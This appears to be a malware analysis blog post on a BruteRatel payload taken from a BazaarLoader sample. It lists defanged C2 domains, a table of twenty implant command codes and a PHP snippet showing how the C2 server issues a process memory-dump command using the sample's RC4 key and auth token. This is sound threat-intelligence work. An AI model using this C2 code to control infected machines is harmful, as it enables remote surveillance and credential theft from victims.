---
title: "BruteRatel full command analysis 1/X"
date: 2025-03-XX
---

<link rel="stylesheet" href="/css/main.css">

## BazaarLoader / BRUTERATEL  

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041 
http://greshunka[.]com/admin.php:8041 

# INTRO  

This article is a follow-up from a previous post regarding a BazaarLoader sample analysis : [Initial Post](https://cedricg-mirror.github.io/2025/02/04/BazaarLoader.html)  
After going through various stages of unpacking and in-memory loading, I was able to retrieve the finale payload from the initial sample and made it available on [bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)  

Working on the final payload made the sample analysis much more straightforward and given the sheer amount of functionalities offered by this malware I've decided to review them all.  

This detailed analysis will be split into several parts, I will be presenting in this the 'first' 20 commands that BruteRatel can respond to.  

# COMMAND LIST

Here is a short description of the first 20 command codes and purpose :  

| Command ID   | Description             | Parameter     |
| :----------- | :---------------------- | :------------:|
| "\x9f\x3c"   | GetCurrentDirectory     | NA            |
| "\x3f\xd5"   | GetIpTable              | NA            |
| "\xfe\x4f"   | GetAccountPrivileges    | NA            |
| "\x91\x03"   | LockWorkStation         | NA            |
| "\x09\x06"   | GetLogicalDrives        | NA            |
| "\x01\x0a"   | GetSystemUptime         | NA            |
| "\x06\x0b"   | GetLastInputInfo        | NA            |
| "\x03\x07"   | ExitProcess             | NA            |
| "\x05\x06"   | RevertToSelf            | NA            |
| "\x05\x01"   | GetClipBoardData        | NA            |
| "\x44\xc1"   | EnumDevicesDrivers      | NA            |
| "\x41\x9c"   | Screenshot              | NA            |
| "\xcb\xe3"   | GetDomainControlerInfo  | NA            |
| "\x16\xf6"   | GetNetworkAdaptersInfo  | NA            |
| "\x03\x08"   | ExitThread              | NA            |
| "\x34\x49"   | GetMemoryDump           | "processname" |
| "\x39\xb3"   | GetTcpUdpTables         | NA            | 
| "\x1a\xd4"   | GetIpForwardTable       | NA            | 
| "\x9a\xbe"   | QuerySessionInformation | NA            | 
| "\xb7\x38"   | GetDnsCacheDataTable    | NA            |

# Command Syntaxe  

On the C2 side, a command can be issued this way (example with the GetMemoryDump order) :  

```php
$RC4Key = "S47EFEUO3D2O6641";
$auth_token = "OV1T557KBIUECUM5";

function GetMemoryDump($process_name)
{
	$cmd_id = "\x34\x49 $process_name";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST')
{
	$cmd_id_b64 = GetMemoryDump("explorer.exe");
	
	$cmd = "$auth_token, $cmd_id_b64";
	$cmd_enc = rc4($Rc4Key, $cmd);
	$cmd_b64 = base64_encode($cmd_enc);
	echo $cmd_b64;
	
	return;
}
```

# Dynamic Analysis  


